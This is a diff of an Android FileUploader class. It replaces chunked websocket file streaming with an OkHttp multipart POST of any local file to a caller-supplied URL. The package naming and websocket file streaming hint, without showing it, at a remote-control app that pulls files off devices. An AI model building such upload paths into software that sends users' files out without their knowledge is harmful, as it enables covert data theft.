@@ -6,43 +6,51 @@ import android.util.Log;
 import com.xrc.system.core.Constants;
 
 import java.io.File;
-import java.io.FileInputStream;
+import java.io.IOException;
+import java.util.concurrent.TimeUnit;
+
+import okhttp3.MediaType;
+import okhttp3.MultipartBody;
+import okhttp3.OkHttpClient;
+import okhttp3.Request;
+import okhttp3.RequestBody;
 
 public class FileUploader {
     private static final String TAG = Constants.TAG + ":Upload";
-    private static final int CHUNK_SIZE = 32768;
-    private final Context ctx;
+    private static final int TIMEOUT = 30;
+    private OkHttpClient client;
 
-    public FileUploader(Context ctx) {
-        this.ctx = ctx.getApplicationContext();
+    public FileUploader() {
+        client = new OkHttpClient.Builder()
+                .connectTimeout(TIMEOUT, TimeUnit.SECONDS)
+                .readTimeout(TIMEOUT, TimeUnit.SECONDS)
+                .build();
     }
 
-    public void uploadFile(String path) {
-        new Thread(() -> {
-            try {
-                File file = new File(path);
-                if (!file.exists() || !file.canRead()) {
-                    Log.e(TAG, "File not readable: " + path);
-                    return;
-                }
-                long totalSize = file.length();
-                int totalChunks = (int) Math.ceil((double) totalSize / CHUNK_SIZE);
-                try (FileInputStream fis = new FileInputStream(file)) {
-                    byte[] buffer = new byte[CHUNK_SIZE];
-                    int read;
-                    int index = 0;
-                    while ((read = fis.read(buffer)) != -1) {
-                        byte[] chunk = new byte[read];
-                        System.arraycopy(buffer, 0, chunk, 0, read);
-                        XRCXRCWebSocketClient.get(ctx).sendFileChunk(file.getName(), chunk, index, totalChunks);
-                        index++;
-                        Thread.sleep(50);
-                    }
-                }
-                Log.i(TAG, "Upload complete: " + file.getName());
-            } catch (Exception e) {
-                Log.e(TAG, "Upload failed", e);
+    public void uploadFile(Context context, String filePath, String uploadUrl) {
+        try {
+            File file = new File(filePath);
+            if (!file.exists()) {
+                Log.e(TAG, "File not found: " + filePath);
+                return;
             }
-        }).start();
+
+            RequestBody fileBody = RequestBody.create(
+                    file, MediaType.parse("application/octet-stream"));
+
+            RequestBody requestBody = new MultipartBody.Builder()
+                    .setType(MultipartBody.FORM)
+                    .addFormDataPart("file", file.getName(), fileBody)
+                    .build();
+
+            Request request = new Request.Builder()
+                    .url(uploadUrl)
+                    .post(requestBody)
+                    .build();
+
+            client.newCall(request).execute();
+        } catch (IOException e) {
+            Log.e(TAG, "Upload failed", e);
+        }
     }
 }
